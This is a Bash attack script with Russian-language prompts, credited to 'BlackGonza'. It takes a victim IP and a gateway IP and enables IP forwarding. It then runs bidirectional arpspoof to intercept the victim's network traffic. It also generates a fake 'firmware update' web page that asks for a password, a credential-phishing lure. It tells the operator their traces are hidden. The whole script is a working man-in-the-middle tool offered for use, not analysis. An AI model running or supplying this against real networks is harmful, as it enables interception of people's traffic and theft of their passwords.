RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m' 

echo -e "${CYAN}"
echo '

░█████╗░██████╗░██████╗░██╗███████╗██████╗░
██╔══██╗██╔══██╗██╔══██╗██║██╔════╝██╔══██╗
███████║██████╔╝██████╔╝██║█████╗░░██████╔╝
██╔══██║██╔══██╗██╔═══╝░██║██╔══╝░░██╔══██╗
██║░░██║██║░░██║██║░░░░░██║███████╗██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚═╝
'
echo -e "${NC}"

validate_ip() {
    local IP="$1"
    if [[ ! "$IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        return 1
    fi
    local IFS='.'
    local PARTS=($IP)
    for PART in "${PARTS[@]}"; do
        if [[ "$PART" -gt 255 || "$PART" -lt 0 ]]; then
            return 1
        fi
    done
    return 0
}

read -p "Введите интерфейс (например, eth0): " interface

while true; do
    read -p "Введите IP-адрес жертвы: " victim_ip
    if ! validate_ip "$victim_ip"; then
        echo -e "${RED}Неверный формат IP-адреса. Пожалуйста, введите корректный IP-адрес.${NC}"
    else
        break
    fi
done

while true; do
    read -p "Введите IP-адрес шлюза: " gateway_ip
    if ! validate_ip "$gateway_ip"; then
        echo -e "${RED}Неверный формат IP-адреса. Пожалуйста, введите корректный IP-адрес.${NC}"
    else
        break
    fi
done


if [ "$(id -u)" != "0" ]; then
    echo -e "${RED}Этот скрипт должен быть запущен с правами суперпользователя${NC}"
    exit 1
fi

html_file="update_firmware.html"
cat <<EOF > $html_file
<!DOCTYPE html>
<html>
<head>
    <title>Обновление прошивки</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            background-color: #f4f4f4;
            color: #333;
            text-align: center;
        }
        h1 {
            margin-bottom: 20px;
            font-size: 24px;
        }
        p {
            font-size: 18px;
            margin-bottom: 15px;
        }
        input[type="password"] {
            padding: 10px;
            margin: 10px auto;
            display: block;
            border: 2px solid #007bff;
            border-radius: 5px;
            width: 200px;
            transition: border-color 0.3s ease-in-out;
            font-size: 16px;
        }
        input[type="password"]:focus {
            border-color: #0056b3;
            outline: none;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            display: inline-block;
            margin-top: 10px;
            transition: background-color 0.3s ease-in-out;
            font-size: 16px;
        }
        input[type="submit"]:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <h1>Обновление прошивки</h1>
    <p>Введите пароль для обновления прошивки:</p>
    <form action="/update_firmware" method="POST">
        <input type="password" name="password" placeholder="Пароль">
        <input type="submit" value="Обновить">
    </form>
</body>
</html>
EOF

echo 1 > /proc/sys/net/ipv4/ip_forward

echo -e "${YELLOW}Запуск ARP Spoofing...${NC}"

arpspoof -i $interface -t $victim_ip $gateway_ip > /dev/null 2>&1 &
arpspoof -i $interface -t $gateway_ip $victim_ip > /dev/null 2>&1 &


cleanup() {
    killall arpspoof
    echo 0 > /proc/sys/net/ipv4/ip_forward
    arping -c 3 -A -I $interface $victim_ip >/dev/null 2>&1
    arping -c 3 -A -I $interface $gateway_ip >/dev/null 2>&1
}

trap cleanup EXIT

echo -e "${GREEN}ARP Spoofing запущен. Ваши следы маскированы.${NC}"
echo -e "${GREEN}Для Остоновки нажмите на CTRL + C${NC}"
echo -e "${GREEN}Создано BlackGonza.${NC}"

while true; do
    sleep 1
done
